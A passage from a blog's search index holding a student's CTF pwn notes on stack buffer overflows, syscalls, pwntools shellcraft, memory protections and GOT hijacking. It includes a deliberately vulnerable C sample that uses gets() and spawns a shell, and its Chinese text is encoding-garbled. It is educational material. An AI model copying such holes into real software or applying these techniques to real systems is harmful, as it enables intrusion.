class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ul><ol><li>è¼¸å…¥è¶…é 0x10 bitï¼Œå°‡è¦†è“‹å †ç–Šä¸­ <code>main function</code> çš„ return addressã€‚</li><li>ç•¶è¿”å›æ™‚ï¼Œå°‡å †ç–Šçš„å€¼æ”¾å…¥ rip -&gt; <strong>Illegal virtual addr</strong></li><li>å¼•ç™¼ <strong>segmentation fault</strong> -&gt; å †ç–Šå´©æ½°</li></ol><blockquote><p><strong>è“‹ 0x10 bit æœƒåˆ° <code>rbp</code> æ‰€ä»¥è¦åŠ  8 bitè¦†è“‹rbp ä¹‹å¾Œæ‰å¡«å…¥è¦å»çš„address (ä½¿ç”¨pwntools <code>p64()</code>)</strong></p></blockquote><ul><li><code>gets(buf)</code>: <strong>danger function</strong></li><li>Will print out secrct key or other info</li><li><code>Control rip</code> -&gt; <code>pwned</code></li></ul><br><h2 id="Linux-syscall"><a href="#Linux-syscall" class="headerlink" title="Linux syscall"></a>Linux syscall</h2><blockquote><p>å’Œ kernal æºé€šçš„ interface</p></blockquote><ul><li>instruction - syscall</li><li><strong>rax</strong> - syscall number</li><li>Arguments - <strong>rdi, rsi, rdx, r10, r8 ,r9</strong></li><li>return value - <strong>rax</strong></li><li>Ex: <code>read(0,buf,0x100)</code></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xor rdi, rdi       ; å°‡ rdi å¯„å­˜å™¨æ¸…é›¶ï¼Œç”¨ä½œæ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">mov rsi, 0x60100   ; å°‡ rsi å¯„å­˜å™¨è¨­ç½®ç‚ºç·©è¡å€çš„åœ°å€ï¼ˆ0x60100ï¼‰</span><br><span class="line">mov rdx, 0x100     ; å°‡ rdx å¯„å­˜å™¨è¨­ç½®ç‚ºè¦è®€å–çš„å­—ç¯€æ•¸ï¼ˆ0x100ï¼Œ256 å­—ç¯€ï¼‰</span><br><span class="line">mov eax, 0         ; å°‡ eax å¯„å­˜å™¨è¨­ç½®ç‚ºç³»çµ±èª¿ç”¨ç·¨è™Ÿï¼Œ0 è¡¨ç¤º read</span><br><span class="line">syscall            ; åŸ·è¡Œç³»çµ±èª¿ç”¨</span><br></pre></td></tr></table></figure></div><p><strong>REF</strong>: <a href="/@RinHizakura/S1wfy6nQO">Linux æ ¸å¿ƒè¨­è¨ˆ: System call</a></p><h2 id="Shell-Code"><a href="#Shell-Code" class="headerlink" title="Shell Code"></a>Shell Code</h2><ul><li>Assembler</li><li>asm -&gt; machine code</li><li><code>pwntools.shellcraft</code></li><li><code>i386</code> , <code>amd64</code></li></ul><h3 id="x86-shellcraft"><a href="#x86-shellcraft" class="headerlink" title="x86 shellcraft"></a>x86 shellcraft</h3><ul><li><code>shellcraft.open(b&#39;/home/orw/flag&#39;)</code>ï¼š<ul><li>åƒæ•¸ï¼šæ–‡ä»¶è·¯å¾‘çš„å­—ä¸²è¡¨ç¤ºï¼ˆä¾‹å¦‚ bâ€™&#x2F;home&#x2F;orw&#x2F;flagâ€™ï¼‰ã€‚</li><li>æ„ç¾©ï¼šè¦æ‰“é–‹çš„æ–‡ä»¶çš„è·¯å¾‘ã€‚</li></ul></li><li><code>shellcraft.read(&#39;eax&#39;,&#39;esp&#39;,50)</code>ï¼š<ul><li>åƒæ•¸ï¼šread ç³»çµ±èª¿ç”¨çš„ä¸‰å€‹åƒæ•¸ï¼Œåˆ†åˆ¥æ˜¯æ–‡ä»¶æè¿°ç¬¦ã€ç·©è¡å€åœ°å€å’Œè¦è®€å–çš„å­—ç¯€æ•¸ã€‚</li><li>æ„ç¾©ï¼š<ul><li><code>eax</code>ï¼šä½œç‚ºæ–‡ä»¶æè¿°ç¬¦ï¼ˆé€šå¸¸æ˜¯ open ç³»çµ±èª¿ç”¨çš„è¿”å›å€¼ï¼‰ã€‚</li><li><code>esp</code>ï¼šä½œç‚ºç·©è¡å€åœ°å€ï¼Œé€™è£¡æ˜¯ä½¿ç”¨å †ç–Šé ‚éƒ¨ä½œç‚ºç·©è¡å€åœ°å€ã€‚</li><li><code>50</code>ï¼šè¦è®€å–çš„å­—ç¯€æ•¸ï¼Œé€™è£¡æ˜¯è®€å– 50 å€‹å­—ç¯€ã€‚</li></ul></li></ul></li></ul><ul><li><code>shellcraft.write(&#39;1&#39;,&#39;esp&#39;,50)</code>ï¼š<ul><li>åƒæ•¸ï¼šwrite ç³»çµ±èª¿ç”¨çš„ä¸‰å€‹åƒæ•¸ï¼Œåˆ†åˆ¥æ˜¯æ–‡ä»¶æè¿°ç¬¦ã€ç·©è¡å€åœ°å€å’Œè¦å¯«å…¥çš„å­—ç¯€æ•¸ã€‚</li><li>æ„ç¾©ï¼š<ul><li><code>1</code>ï¼šä½œç‚ºæ–‡ä»¶æè¿°ç¬¦ï¼Œè¡¨ç¤ºå¯«å…¥åˆ°æ–‡ä»¶æè¿°ç¬¦ç‚º 1 çš„æ–‡ä»¶ä¸­ï¼ˆé€šå¸¸æ˜¯<strong>æ¨™æº–è¼¸å‡º</strong>ï¼‰ã€‚</li><li><code>esp</code>ï¼šä½œç‚ºç·©è¡å€åœ°å€ï¼Œé€™è£¡æ˜¯ä½¿ç”¨å †ç–Šé ‚éƒ¨ä½œç‚ºç·©è¡å€åœ°å€ã€‚</li><li><code>50</code>ï¼šè¦å¯«å…¥çš„å­—ç¯€æ•¸ï¼Œé€™è£¡æ˜¯å¯«å…¥ 50 å€‹å­—ç¯€ã€‚</li></ul></li></ul></li></ul><br><h2 id="Protector"><a href="#Protector" class="headerlink" title="Protector"></a>Protector</h2><blockquote><p><a class="link"   href="https://ithelp.ithome.com.tw/articles/10227876" >Protector <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h3 id="stack-protector"><a href="#stack-protector" class="headerlink" title="stack-protector"></a>stack-protector</h3><ul><li>With protector<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/ryWOmUF5T.png"                      alt="image"                ></li><li><strong>If overflow</strong><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/Hkm_8IF5a.png"                      alt="image"                ></li></ul><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/rky6Qx_cp.png"                      alt="image"                ></p><blockquote><p>ç·¨è­¯å™¨æœƒå°‡ä¸€å€‹ç‰¹æ®Šçš„å€¼ï¼ˆcanary valueï¼‰æ’å…¥åˆ°å‡½å¼çš„å †ç–Šæ¡†æ¶ä¸­ï¼Œé€šå¸¸æ˜¯åœ¨å‡½å¼çš„è¿”å›åœ°å€ä¹‹å‰ã€‚ç•¶å‡½å¼åŸ·è¡Œå®Œæˆæ™‚ï¼Œç·¨è­¯å™¨æœƒæª¢æŸ¥é€™å€‹ canary value æ˜¯å¦è¢«ä¿®æ”¹ã€‚å¦‚æœ canary value è¢«ä¿®æ”¹ï¼Œå‰‡èªç‚ºç™¼ç”Ÿäº†<strong>å †ç–Šæº¢ä½</strong>ï¼Œå¯èƒ½æ˜¯ä¸€æ¬¡æ”»æ“Šï¼Œå› æ­¤ç¨‹å¼åŸ·è¡Œæœƒè¢«<strong>ä¸­æ–·</strong>æˆ–æ¡å–å…¶ä»–ç›¸æ‡‰çš„å®‰å…¨æªæ–½ã€‚</p></blockquote><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><blockquote><p>Data segment no execute</p></blockquote><ul><li>stack,heap</li><li>rw-</li></ul><blockquote><p>Code segment</p></blockquote><ul><li>r-x</li></ul><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><blockquote><p>Address Space Layout Randomization</p></blockquote><ul><li>kernel</li><li>æ¯æ¬¡è¼‰å…¥æ™‚ï¼Œbase éƒ½æ˜¯éš¨æ©Ÿçš„</li></ul><p><code>lld ./orw</code></p><blockquote><p><code>List Dynamic Dependencies</code><br>ç•¶é‹è¡Œ <code>ldd</code> å¾Œè·Ÿè‘—åŸ·è¡Œæª”æˆ–å…±äº«åº«çš„è·¯å¾‘æ™‚ï¼Œå®ƒå°‡è¼¸å‡ºæŒ‡å®šæ–‡ä»¶æ‰€ä¾è³´çš„<strong>å…±äº«åº«</strong>å’Œ<strong>è·¯å¾‘</strong>åˆ—è¡¨ã€‚</p></blockquote><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><blockquote><p>Position-Independent Executable<br><code>PIC</code> : Position-Independent Code åœ¨å‹•æ…‹é€£çµåº«ä¸­é‡æ–°å®šä½ç¬¦è™Ÿ</p></blockquote><ul><li>ELF code å’Œ data sections mapping åˆ° virtual addresses çš„ASLR. </li><li>Changing code base  every time ,or 0x40000</li><li>Record in ELF file</li><li>å¯ä»¥å¾ ELF header å»æ‰</li></ul><h3 id="Lazy-Binding"><a href="#Lazy-Binding" class="headerlink" title="Lazy Binding"></a>Lazy Binding</h3><blockquote><p><a class="link"   href="https://ithelp.ithome.com.tw/m/articles/10268401" >æ·±å…¥ç†è§£å‹•æ…‹é€£çµ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HJ15ez5hT.png"                      alt="image"                ></p><blockquote><p>å‹•æ…‹åº«è§£æå‡½æ•¸åœ°å€çš„ç­–ç•¥ã€‚<br>å‡½æ•¸åœ°å€åœ¨<strong>ç¬¬ä¸€æ¬¡èª¿ç”¨</strong>æ™‚æ‰è¢«è§£æï¼Œè€Œä¸æ˜¯åœ¨ç¨‹å¼åŠ è¼‰æ™‚è§£æã€‚<br>æé«˜æ€§èƒ½å’Œæ¸›å°‘å…§å­˜ä½¿ç”¨ã€‚</p></blockquote><blockquote><p>ç¸½çµï¼š<strong>ç•¶çœŸæ­£èª¿ç”¨æ™‚ï¼Œæ‰æœƒå»è¼‰å…¥ Function</strong></p></blockquote><br><h2 id="GOT-PLT"><a href="#GOT-PLT" class="headerlink" title="GOT &amp; PLT"></a>GOT &amp; PLT</h2><blockquote><p><a class="link"   href="https://hackmd.io/@rhythm/ry5pxN6NI" >REF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h3 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h3><blockquote><p><code>Global Offset Table</code></p></blockquote><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HJOt8M5h6.png"                      alt="image"                ></p><ul><li>å­˜å„²<strong>å‹•æ…‹é€£çµåº«ä¸­å…¨å±€è®Šé‡å’Œå‡½æ•¸</strong>çš„åœ°å€ï¼Œç•¶ç¨‹å¼éœ€è¦å­˜å–é€™äº›å…¨å±€è®Šé‡æˆ–å‡½æ•¸æ™‚ï¼Œé€šéGOTä¸­å­˜å„²çš„åœ°å€ä¾†é€²è¡Œè¨ªå•ã€‚</li><li>è§£æå…¨å±€è®Šé‡å’Œå‡½æ•¸çš„åœ°å€ï¼Œå¾è€Œå¯¦ç¾<strong>å‹•æ…‹é€£çµ</strong>ï¼Œ<strong>ç¨‹å¼å…±äº«</strong></li><li><code>æ›¿æ›GOTåœ°å€</code> inject</li></ul><h3 id="PLT-éç¨‹é€£çµè¡¨"><a href="#PLT-éç¨‹é€£çµè¡¨" class="headerlink" title="PLT (éç¨‹é€£çµè¡¨)"></a>PLT (éç¨‹é€£çµè¡¨)</h3><blockquote><p><code>Procedural Linkage Table</code></p></blockquote><p>ç¬¬ä¸€æ¬¡èª¿ç”¨ä¸€å€‹å‡½æ•¸æ™‚ï¼Œæœƒèª¿ç”¨å½¢å¦‚ <code>function@PLT</code> çš„å‡½æ•¸ã€‚è·³è½‰åˆ°å‡½æ•¸å°æ‡‰çš„PLTè¡¨é–‹é ­åŸ·è¡Œï¼Œè§£æå‡ºå‡½æ•¸çœŸæ­£çš„åœ°å€<strong>å¡«å…¥GOTè¡¨</strong>ã€‚å†èª¿ç”¨æ™‚ï¼Œæœƒç›´æ¥å¾GOTè¡¨ä¸­å–å‡ºå‡½æ•¸èµ·å§‹åœ°å€åŸ·è¡Œã€‚</p><h3 id="GOT-PLT-å‘¼å«æ­¥é©Ÿ"><a href="#GOT-PLT-å‘¼å«æ­¥é©Ÿ" class="headerlink" title="GOT &amp; PLT å‘¼å«æ­¥é©Ÿ"></a>GOT &amp; PLT å‘¼å«æ­¥é©Ÿ</h3><ol><li>å‘¼å« <code>printf()</code> å‡½å¼æ™‚ï¼Œåœ¨çµ„åˆèªè¨€ä¸­æœƒçœ‹åˆ° call <code>printf@plt</code>ã€‚</li><li>printf@GOT æœƒå¾ .got.plt ä¸­å–å¾—å‡½å¼çš„åœ°å€ã€‚<blockquote><p><code>If function == FirstCall :</code> åœ¨ GOT è¡¨ä¸­æ‰¾ä¸åˆ°åœ°å€ -&gt; é€é PLT é€²è¡Œå®šä½ã€‚</p></blockquote></li><li>å°‡å‡½å¼æ‰€éœ€çš„åƒæ•¸æ¨å…¥å †ç–Šä¸­</li><li>é€šéåŸ·è¡Œ <code>dl_runtime_resolve</code> æ‰¾å‡ºå‡½å¼ä½å€ã€‚</li><li>æœ€å¾Œï¼Œç³»çµ±æœƒå°‡å‡½å¼çš„ä½å€å¯«å…¥ <strong>.got.plt</strong> ä¸­ï¼Œç­‰å¾…ä¸‹æ¬¡å‘¼å«ã€‚</li></ol><blockquote><p>Attack: <a href="https://b0ldfrev.gitbook.io/note/pwn/returntodlresolve-yuan-li-ji-li-yong"><code>Ret2dlresolve</code></a></p></blockquote><h3 id="h3GOT-Hijacking"><a href="#h3GOT-Hijacking" class="headerlink" title="h3GOT Hijacking"></a>h3GOT Hijacking</h3><ul><li>å› ç‚º Lazy bindingï¼ŒGOTç‚º<strong>å¯å¯«å€åŸŸ</strong></li><li>ä¸€æ—¦GOTè¢«å¯«å…¥è¦†è“‹ï¼Œä¸‹ä¸€æ¬¡å‘¼å« <code>Library function</code> æ™‚å¯ä»¥è¢«åŠ«æŒï¼Œå¾è€Œæ§åˆ¶å³å°‡åŸ·è¡Œçš„ <code>Function Pointer</code></li></ul><h1 id="NEXT"><a href="#NEXT" class="headerlink" title="NEXT"></a>NEXT</h1><p><a class="link"   href="https://hackmd.io/@KzcDuD/NTU-computer-security-pwn-2" >NTU-computer-security-pwn-2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="è§£é¡Œ-REF"><a href="#è§£é¡Œ-REF" class="headerlink" title="è§£é¡Œ &amp; REF"></a>è§£é¡Œ &amp; REF</h1><blockquote><p><a href="/@KzcDuD/r1i7cBoaa">Lab</a><br><a href="/@KzcDuD/Bk3DMy2tT">Pico</a></p></blockquote><blockquote><p><a class="link"   href="https://b0ldfrev.gitbook.io/note/pwn" >Note <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><blockquote><p><a href="/@u1f383/pwn-cheatsheet">CheatSheet</a> from <code>@u1f383</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTTU CSclube pwn part 1.</title>
      <link href="/2024/05/09/nttu-csclub-pwn/"/>
      <url>/2024/05/09/nttu-csclub-pwn/</url>
      
        <content type="html"><![CDATA[<blockquote><p>è³‡å®‰ç¤¾ç¸½å‹™ç¬¬äºŒæ¬¡ä¸Šç¤¾èª²</p></blockquote><h2 id="Prepare"><a href="#Prepare" class="headerlink" title="Prepare"></a>Prepare</h2><ol><li>VirtualMachine <a class="link"   href="https://hackmd.io/@SCIST/VirtualBox" >install tutorial <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>ubuntu <a class="link"   href="https://ubuntu.com/download/desktop" >22.04 LTS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>gdb <code>sudo apt udate; apt install gdb</code></li><li><a class="link"   href="https://github.com/longld/peda" >peda <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://chihhhs.github.com/" >lab <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ol><h2 id="x86-64-assembly"><a href="#x86-64-assembly" class="headerlink" title="x86_64 assembly"></a>x86_64 assembly</h2><h3 id="Registers"><a href="#Registers" class="headerlink" title="Registers"></a>Registers</h3><ul><li><p>RAX RBX RCX RDX RDI RSI - 64 bit</p></li><li><p>EAX EBX ECX EDX EDI ESI - 32 bit</p></li><li><p>AX BX CX DX DI SI - 16 bit</p></li><li><p>AX -&gt; AH AL - 8 bit</p></li><li><p>RSP</p></li><li><p>RBP</p></li><li><p>RIP</p></li></ul><h3 id="Instruction"><a href="#Instruction" class="headerlink" title="Instruction"></a>Instruction</h3><ul><li>jmp</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># jmp a = </span><br><span class="line">mov rip,a</span><br></pre></td></tr></table></figure></div><ul><li>call</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># call a =</span><br><span class="line">push next_rip;</span><br><span class="line">mov rip,a;</span><br></pre></td></tr></table></figure></div><ul><li>leave</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure></div><ul><li>ret</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure></div><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><ul><li><code>.bss</code>ï¼š æœªåˆå§‹åŒ–å…¨åŸŸè®Šæ•¸</li><li><code>.data</code>ï¼š åˆå§‹åŒ–å…¨åŸŸè®Šæ•¸</li><li><code>.rodata</code>ï¼šRead only data</li><li><code>.text</code>ï¼š ç¨‹å¼ç¢¼æ®µ</li></ul><p><code>readelf -S &lt;elf&gt;</code></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b=<span class="number">100</span>;</span><br><span class="line"><span class="type">int</span>  <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> c; </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;30 cm&quot;</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>Read offset</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$readelf</span> -S elf</span><br><span class="line"></span><br><span class="line">        |addr                    | offset |</span><br><span class="line">| .data |0x0000000000404008      | 3008   |</span><br><span class="line">| .bss  |0x00000000040401c       | 301c   |</span><br><span class="line"></span><br><span class="line">$ (gdb) x/30 0x0000000000404008</span><br><span class="line">    &lt;b&gt;  0x0000000000000064</span><br><span class="line"></span><br><span class="line"><span class="variable">$xxd</span> elf</span><br></pre></td></tr></table></figure></div><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><blockquote><p><a class="link"   href="https://github.com/Gallopsled/pwntools" >pwntools <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h2 id="Function-Prologue-Epilogue"><a href="#Function-Prologue-Epilogue" class="headerlink" title="Function Prologue &amp; Epilogue"></a>Function Prologue &amp; Epilogue</h2><h3 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h3><ol><li>call func &#x3D; <code>push %next-rip;</code> <code>jmp func</code></li><li><code>mov $eax,0</code> <code>push func</code> allcation in RAM</li><li>%rip -&gt; func : push rbp <code>%save-rbp</code></li><li>mov $rbp, $rsp</li><li>sub %rsp,0x70 0x70 #compiler æ±ºå®š &gt;&gt; To store local variable</li><li>Prologue finish</li></ol><h3 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h3><ol><li>leave &#x3D; <code>mov %rsp,%rbp;</code>  <code>pop %rbp;</code></li><li><code>pop %rbp</code> -&gt; get <code>%saved-rbp</code> segment.</li><li>ret &#x3D; <code>pop $rip</code></li><li>%rip Back to <code>%next-rip</code></li><li>Epilogue finish</li></ol><h2 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h2><blockquote><p><code>Hijack return address , control rip.</code></p></blockquote><ul><li><code>bof.c</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><figcaption><span>bof.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">call_me</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&#x27;sh&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ol><li>è¼¸å…¥è¶…é 0x18 bitï¼Œå°‡è¦†è“‹å †ç–Šä¸­ main function çš„ return addressã€‚</li><li>ç•¶è¿”å›æ™‚ï¼Œå°‡å †ç–Šçš„å€¼æ”¾å…¥ rip -&gt; Illegal virtual addr</li><li>å¼•ç™¼ segmentation fault -&gt; å †ç–Šå´©æ½°</li></ol><blockquote><p>è“‹<code>0x10 bit</code> æœƒåˆ° rbp æ‰€ä»¥è¦åŠ  8 bitè¦†è“‹rbp ä¹‹å¾Œæ‰å¡«å…¥è¦å»çš„address (ä½¿ç”¨pwntools p64())</p></blockquote><ul><li><code>gets(buf)</code>: <strong>danger function</strong></li></ul><h3 id="Linux-SysCall"><a href="#Linux-SysCall" class="headerlink" title="Linux SysCall"></a>Linux SysCall</h3><blockquote><p>å’Œ kernal æºé€šçš„ <code>interface</code></p></blockquote><ul><li>instruction -syscall</li><li>$rax -Syscall_number</li><li>Arguments - <code>(rdi, rsi, rdx, r10, r8 ,r9)</code></li><li>return value - $rax<br>Ex: read(0,buf,0x100)</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xor rdi, rdi       ; å°‡ rdi å¯„å­˜å™¨æ¸…é›¶ï¼Œç”¨ä½œæ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">mov rsi, 0x60100   ; å°‡ rsi å¯„å­˜å™¨è¨­ç½®ç‚ºç·©è¡å€çš„åœ°å€ï¼ˆ0x60100ï¼‰</span><br><span class="line">mov rdx, 0x100     ; å°‡ rdx å¯„å­˜å™¨è¨­ç½®ç‚ºè¦è®€å–çš„å­—ç¯€æ•¸ï¼ˆ0x100ï¼Œ256 å­—ç¯€ï¼‰</span><br><span class="line">mov eax, 0         ; å°‡ eax å¯„å­˜å™¨è¨­ç½®ç‚ºç³»çµ±èª¿ç”¨ç·¨è™Ÿï¼Œ0 è¡¨ç¤º read</span><br><span class="line">syscall            ; åŸ·è¡Œç³»çµ±èª¿ç”¨</span><br></pre></td></tr></table></figure></div><h2 id="ShellCode"><a href="#ShellCode" class="headerlink" title="ShellCode"></a>ShellCode</h2><ol><li>input <strong>shellcode</strong> (Syscall)</li><li>overflow to the address of shellcode</li></ol><h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> prectice</span><br><span class="line"><span class="variable">$docker</span> compose up -d</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>About</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h1 align="center">  <a href="https://Chihhhs.github.io" style="color: #708090;">Chihhhs</a>    <br />  <img                       lazyload                     src="/images/loading.svg"                     data-src="/images/avatar.jpg"                      alt="avatar" style="width: 220px; height: 200px;"                ></h1><h3 id="About-Me"><a href="#About-Me" class="headerlink" title="About Me"></a>About Me</h3><ul><li>A student in <strong>CSIE</strong></li><li>Playing CTFs</li></ul><h3 id="My-Game-Record"><a href="#My-Game-Record" class="headerlink" title="My Game Record"></a>My Game Record</h3><ul><li>2023 CyberPunk2077 <strong>AllDone</strong></li><li>2024&#x2F;04&#x2F;13 Elden Ring <strong>pass</strong></li></ul><h3 id="Tags"><a href="#Tags" class="headerlink" title="Tags"></a>Tags</h3><p align="left">  <a href="https://skillicons.dev">    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://skillicons.dev/icons?i=pytorch,flask"                                      >  </a></p><p align="left">  <a href="https://skillicons.dev">    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://skillicons.dev/icons?i=linux,kali,ubuntu"                                      >  </a></p><p align="left">  <a href="https://skillicons.dev">    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://skillicons.dev/icons?i=github,vim,vscode,docker"                                      >  </a></p><p align="left">  <a href="https://skillicons.dev">    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://skillicons.dev/icons?i=bash,c,cpp,py,java,latex"                                      >  </a></p><hr><div id="header" align="center">  <img                       lazyload                     src="/images/loading.svg"                     data-src="https://komarev.com/ghpvc/?username=KzcDuD&style=for-the-badge&color=gray"                      alt=""                ></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
